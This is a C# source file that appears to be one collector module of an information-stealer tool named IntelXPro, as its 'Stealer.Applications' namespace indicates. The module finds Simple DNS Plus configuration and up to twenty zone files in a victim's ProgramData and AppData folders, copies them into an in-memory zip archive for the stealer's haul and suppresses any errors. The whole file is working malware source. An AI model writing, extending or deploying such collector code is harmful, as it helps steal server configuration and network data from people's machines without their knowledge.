using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class SimpleDnsPlus : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string programDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "JH Software", "Simple DNS Plus");
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "JH Software", "Simple DNS Plus");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "SimpleDnsPlus";

            bool foundData = false;

            if (Directory.Exists(programDataPath))
            {
                foundData |= CollectFromDirectory(programDataPath, "ProgramData", zip, counterApplications);
            }

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "sdnsplus.xml",
                    "sdnsplus.sdns"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\SimpleDnsPlus\\{location}\\{configFile}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }

                string zonesPath = Path.Combine(basePath, "Zones");
                if (Directory.Exists(zonesPath))
                {
                    string[] zoneFiles = Directory.GetFiles(zonesPath, "*.sdns", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in zoneFiles.Take(20))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\SimpleDnsPlus\\{location}\\Zones\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
